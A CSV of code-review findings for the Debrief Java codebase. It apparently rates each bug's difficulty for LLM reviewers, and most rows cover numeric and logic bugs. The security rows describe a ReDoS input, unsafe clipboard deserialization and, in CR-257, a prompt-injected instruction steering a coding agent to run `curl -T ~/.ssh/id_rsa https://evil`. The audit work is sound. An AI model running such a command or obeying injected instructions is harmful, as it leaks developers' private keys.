id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-239,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.views,StackedDotHelper,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/views/StackedDotHelper.java,bug,logic-error,Low,High,candidate,Single-point primary track ignores flipAxes: unflipped course is plotted,"getSinglePointCourseData computes thisCourse (wrapped to +/-180 when flipAxes) but then stores 'ownshipCourse' in the ColouredDataItem, so with 'Centre Bearing axis on North' enabled a single-location sensor platform plots its course at e.g. 200 instead of -160, off the +/-180 axis. The multi-fix path (getStandardCourseData) handles it correctly.",L1305-L1315,"Primary track with one fix, course 200, relativeAxes checked.",Pass thisCourse to the ColouredDataItem constructor.,S,Variable computed and then not used; needs semantic reading.,-,
CR-240,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.moving_average,CenteredMovingAverage,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/moving_average/CenteredMovingAverage.java,bug,division-by-zero,Low,High,verified,period==0 yields divisor 0 (lastForward < lastBackward) so every average is N...,"With period 0 (asserts are disabled at runtime) distance=(0-1)/2=0 and mod=(0-1)%2=-1, so lastForwardIndex=n-1 and lastBackwardIndex=n; the loops do not run and the method returns data[n]/0 (python: divisor 0). OwnshipLegDetector passes avgPeriod=0 whenever times.length<=2 or the fix spacing exceeds minsOfAverage minutes, so all smoothed speeds become NaN and 'speedRate < SPEED_TOLERANCE' is false for every sample, producing no legs.",L61; L69-L76,Ownship fixes every 6 minutes with minsOfAverage=5 -> avgPeriod=(300000/360000)=0.,"Treat period<=1 as 'no smoothing' (return data[n]) and validate period in the constructor with an exception, not an assert.",S,Requires evaluating Java integer division/modulo of negative numbers for the degenerate period.,-,
CR-241,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.ownship,OwnshipLegDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/ownship/OwnshipLegDetector.java,algorithm-correctness,angle-wrap,Low,High,candidate,Course averaging and course-rate use raw 0..360 courses without unwrapping,"TimeBasedMovingAverage.average() is applied to rawCourses and courseRate = |thisCourse-lastCourse|/dt with no fold, so a heading oscillating around north averages to ~180 and every north crossing registers as a turn. Also avgPeriod = (mins*60*1000)/delta divides by a long delta that is 0 when the first two fixes share a time (ArithmeticException), and avgPeriod becomes 0 when fixes are sparser than the averaging window, which makes CenteredMovingAverage divide by zero (see separate row). The class is not currently selected by StackedDotHelper.sliceOwnship, hence Low.",L105; L120-L121; L78,"Ownship track with courses 359, 1, 358, 2 or with two fixes at the same DTG at the start of the track.",Run makeContinuous() on the courses before averaging (as PeakTrackingOwnshipLegDetector does) and guard delta<=0.,S,Averaging across a discontinuity is only wrong by domain knowledge; no lint rule.,-,
CR-242,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.ownship.alternate,SCAlgorithms,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/ownship/alternate/SCAlgorithms.java,algorithm-correctness,unit-mismatch,Low,Medium,candidate,Range tests divide by sqrt(stdev) and sum stdev instead of variance,"isMaxRangeInAllowedLimits computes (max-min)/Math.sqrt(dstdev) - the studentised range should be divided by the standard deviation, not its square root (units of sqrt(degrees)); adjustRangeTouchingIntervals sums stdev*(n-1) where adjustDevTouchingIntervals correctly sums stdev^2*(n-1); mergeSimpleIntervals uses the signed difference mean1-mean2 so a large negative difference always wins. These paths (fifo_maxrange/merge*) are not used by extractSteadyHeadings/Speeds today, hence Low.",L647; L181-L182; L795; L839-L843,Calling fifo_maxrange or mergeRangeIntervals on heading data with stdev < 1 (sqrt inflates the divisor) or > 1.,"Divide by dstdev, square the stdevs, and use Math.abs for the mean difference.",S,Dimensional analysis of the statistical formulas; not grep-able.,-,
CR-243,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.ownship.alternate,SCStatistics,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/ownship/alternate/SCStatistics.java,algorithm-correctness,statistical-error,Low,Medium,candidate,"Variance field set to 3*sigma, t-quantile indexed by n instead of dof, empty-...","isolateNonHomogeneous replaces a near-zero reference variance with 3.0*steady_stdev (a standard deviation, not a variance) before the F-test, biasing the ratio; areMeansEqual looks up get95StudentQuantil(min(n1,n2)) although the tables are indexed by degrees of freedom (n-1 or n1+n2-2); isolateNonHomogeneous dereferences _variances.get(0) when 'intervals' is empty (IndexOutOfBounds). lregression/lregressionEx also divide by (num-2) and by sigma0 without guards (num==2 or perfect fit -> NaN taumax).",L1157-L1158; L98-L108; L366-L367; L1143-L1145; L1282; L1291; L1389-L1391,"extractSteadySpeeds on a track where fifo_maxdev finds no steady interval (empty list -> exception), or speed data with two identical values.","Square the fallback (9*stdev^2), pass dof to the quantile functions, and return early on empty interval lists.",S,Needs statistical knowledge of what each table/parameter represents.,-,
CR-244,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.target,ZigDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/target/ZigDetector.java,algorithm-correctness,off-by-one,Low,Medium,candidate,TPeriod treated as inclusive by slicing code but exclusive by subList-based f...,"handleNewSlices, sliceThis2 (legTimes.get(leg.end)) and findLowestRateIn treat TPeriod.end as an inclusive index, but growLeg and runThrough2 use subList(start,end) which excludes end, so each fit silently drops the last sample of the slice (runThrough2 drops the last cut of every contiguous block). runThrough only adds 'increment' when end < size-2, so the last two cuts of a leg are never part of any fit.",L1568-L1570; L2258-L2261; L2093-L2104; L1389; L2481-L2482,Any slice; e.g. a 10-cut block: the fit uses cuts 0..8 while the stored leg reports 0..9.,"Pick one convention (inclusive end) and use subList(start, end+1) consistently.",S,Requires tracking index semantics across several private helpers.,-,
CR-245,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.target,ZigDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/target/ZigDetector.java,bug,division-by-zero,Low,Medium,candidate,"Several unguarded divisions: n-3 normalisation, zero time step, zero variance","FlanaganArctan.function divides by (_times.size()-3), giving Infinity for 3 points and a negative 'mean' for fewer, which the Nelder-Mead minimiser will happily minimise; findLowestRateIn divides bDelta2 by tDelta which is 0 for duplicate timestamps; runThrough divides scoreDelta by getVariance() which is 0 when all cached scores are identical, so thisProportion=Infinity exceeds any zigThreshold and a spurious zig is emitted.",L200; L1362-L1363; L2162-L2169,"Sensor with two cuts at the same DTG, or a synthetic sensor whose first few fits all score exactly 0 (perfect straight-line bearings).","Guard each divisor (require >=4 points, skip zero time steps, treat zero variance as 'not diverging').",S,Three separate code paths; needs reasoning about when the denominators can be zero.,-,
CR-246,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.target,ZigDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/target/ZigDetector.java,bug,dead-code,Low,High,candidate,Debug traps and magic-value checks left in production code,"Hard-coded debugging conditions remain: 'examine = legTimes.get(0) == 4611', 'if (_thisLeg.start + lastOpposite == 52) log(...)', 'me = thisLeg.toString().equals(""aPeriod:31-48"")' (the string can never match because toString() returns 'Period:...'), 'equals(""aPeriod:30-35"") -> println(""bad"")', and System.out.println(""Trouble"") in TPeriod.toString. Also FlanaganArctan_Legacy is unused.",L1323; L1335-L1336; L411-L414; L1563; L1599-L1616; L2287-L2290; L1254; L210-L269,n/a (code hygiene),Delete the debug branches and the unused legacy class.,S,grep-able,-,
CR-250,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.NMEA,ImportNMEA,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/NMEA/ImportNMEA.java,security,performance,Low,Medium,candidate,Multi-wildcard $POSL regexes allow polynomial backtracking on hostile lines; ...,"osPattern, aisPattern, coursePattern* and speedPattern* contain two or more unanchored '.*' segments applied with matches() to every line of the type (e.g. osPattern L448-449 '\$POSL,(?<SOURCE>\w?POS\d?,.*),(?<LAT>...),(?<LONG>...),.*'). A long non-matching line of commas ('$POSL,POS,GPS,' followed by ~1e5 commas) forces O(n^2)-O(n^3) backtracking before rejection, hanging the import thread; readLine has no line-length cap. The '*hh' NMEA checksum is never validated, so corrupted sentences are accepted.",L403-L449; L750-L752,"NMEA text file containing one 200 KB line beginning '$POSL,POS,GPS,' followed by repeated ',,,,'","Reject lines longer than a sane NMEA maximum (e.g. 1024 chars) before regex matching, replace '.*' between fixed comma-separated fields with '[^,]*', and validate the NMEA XOR checksum.",M,Requires reasoning about regex backtracking complexity rather than pattern grep.,-,
CR-251,A10,org.mwc.cmap.plotViewer,org.mwc.cmap.plotViewer.editors,CorePlotEditor,org.mwc.cmap.plotViewer/src/org/mwc/cmap/plotViewer/editors/CorePlotEditor.java,bug,null-deref,Low,High,candidate,getFixedFilePath builds new File(null) and removeSelectionChangedListener on ...,"When the tif referenced by a .dpf is missing and the editor input is neither IFileEditorInput nor FileStoreEditorInput, tiffFilePath stays null and new File(tiffFilePath) throws NPE inside Layers.addThisLayer during file load. When not found it returns the original (non-existent) name so a WorldImageLayer is still created. removeSelectionChangedListener dereferences _selectionListeners which is lazily created only in add.",L781-L815; L976-L978,".dpf referencing a GeoTiff path that does not exist, opened from a FileRevisionEditorInput (history view)",Return null early when tiffFilePath is null and skip creating the layer; null-check _selectionListeners.,S,grep-able,-,
CR-252,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,CopyBearingsToClipboard,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/CopyBearingsToClipboard.java,security,unsafe-deserialization,Low,Low,unverified-needs-runtime,Java-serialized BearingList read back from the system clipboard,"TransferableBearingList uses DataFlavor(BearingList.class,...) i.e. application/x-java-serialized-object, and generatePasteAction calls clip.getData(FLAVOR) on every right-click. When the clipboard owner is another process AWT deserialises the native bytes with ObjectInputStream, so a malicious clipboard payload placed by any local application is deserialised inside Debrief whenever the analyst opens a track context menu.",L525-L557; L707-L717,"Another local process places application/x-java-serialized-object data on the clipboard, then right-click a track","Use a JVM-local flavour (DataFlavor.javaJVMLocalObjectMimeType) or a text encoding, and only accept in-process content.",S,Requires knowledge of AWT DataTransferer deserialisation of serialized-object flavours.,-,
CR-253,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateNewInsertSensorArcAction,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateNewInsertSensorArcAction.java,bug,logic-error,Low,Medium,candidate,Nested undoable operation executed from inside execute(); undo does not refre...,"InsertSensorArcOperation.execute creates a CreateLabelAction and runs it via CorePlugin.run(daw), which adds a second, independent entry to the operation history while the outer operation is itself being executed by the history. Undo of the outer removes the shape via _track.removeElement without firing a Layers event, while the inner entry's undo removes it again.",L76-L106; L114-L118,"Insert new Sensor Arc on a track, then Undo twice and watch the Outline/plot",Call the action's execute()/undo() directly inside the outer operation and fire _layers.fireExtended in undo.,S,Requires understanding IOperationHistory semantics of nested execute.,-,
CR-254,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTMASegmentFromInfillSegment,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTMASegmentFromInfillSegment.java,bug,null-deref,Low,Medium,candidate,Null target speed when solution page incomplete; partial selection accepted,"In run(), speed stays null unless the EnterSolutionPage reports complete, and is passed to AbsoluteTMASegment, whose speed accessors will NPE later. In generate(), a non-FixWrapper item causes break rather than abort, so a mixed selection still yields an action covering only the fixes seen so far.",L248-L265; L220-L222,"Select two infill fixes, run the action and press Finish from the offset page without completing the course/speed page",Default speed to DEFAULT_TARGET_SPEED and return from generate() on non-FixWrapper items.,S,grep-able,-,
CR-255,A10,org.mwc.debrief.lite,org.mwc.debrief.lite,DebriefLiteApp,org.mwc.debrief.lite/src/main/java/org/mwc/debrief/lite/DebriefLiteApp.java,bug,resource-leak,Low,High,candidate,FileInputStream left open when dropped file is not a Nisida file,"FilesReceived opens a FileInputStream to probe ImportNisida.canLoadThisFile and closes it only on the true branch; on false or exception the stream leaks, which on Windows keeps the dropped file locked.",L1092-L1099,Drag a .csv or other unsupported file onto the Lite map,Use try-with-resources around the probe.,S,grep-able,-,
CR-256,A10,org.mwc.debrief.lite,org.mwc.debrief.lite.gui.custom,RangeSlider,org.mwc.debrief.lite/src/main/java/org/mwc/debrief/lite/gui/custom/RangeSlider.java,bug,integer-overflow,Low,High,candidate,Time slider stores epoch seconds in int (Y2038) and truncates sub-second times,"toInt divides millis by 1000 and casts to int, overflowing for dates after 2038-01-19 and collapsing sub-second fixes to one slider position; SliderCompContMdl uses the same conversion. Data files with far-future or test timestamps make the slider wrap negative.",L43; L64,.rep with fixes dated 2040-01-01,Store offsets from the period start in seconds (fits int for any realistic scenario) or use a long-backed model.,S,grep-able,SliderCompContMdl.java L171,
CR-257,A11,.claude,-,settings.local.json,.claude/settings.local.json,security,logic-error,Low,High,candidate,Checked-in Claude settings pre-approve unrestricted curl,"Real type: over-broad agent tool permission. L7 `Bash(curl:*)` auto-allows any curl invocation for every developer who opens the repo in Claude Code, including uploads (`-T`, `-d @file`) of workspace contents to arbitrary hosts and `curl | sh` patterns, with no prompt. A `.local.json` file is meant to be per-developer and is normally gitignored; committing it applies the grant to everyone.",L7,Prompt-injected instruction in a data file or PR that asks the agent to `curl -T ~/.ssh/id_rsa https://evil`.,"Remove settings.local.json from git (add to .gitignore), or narrow to read-only patterns such as `Bash(curl -s https://api.github.com/*)`.",S,grep-able.,-,
